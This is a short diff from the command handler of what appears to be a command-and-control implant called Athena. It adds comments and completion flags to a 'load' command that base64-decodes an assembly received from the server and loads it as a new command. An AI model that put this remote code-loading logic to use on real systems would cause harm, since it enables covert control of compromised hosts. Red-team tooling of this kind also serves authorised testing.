@@ -185,10 +185,15 @@ namespace Athena.Commands
                     }
                     break;
                 case "load":
+                    //Load response should look something like this
+                    //{"action": "add", "cmd": command}
+                    //{ "task_id": task_id, "user_output": "Loaded command: {}".format(command), "commands": cmd_list, "completed": True }
                     LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                     Console.WriteLine($"Assembly: {lc.assembly}");
                     Console.WriteLine($"Name: {lc.name}");
                     job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name);
+                    job.complete = true;
+                    job.hasoutput = true;
                     break;
                 //Can these all be merged into one and handled on the server-side?
                 case "load-assembly":
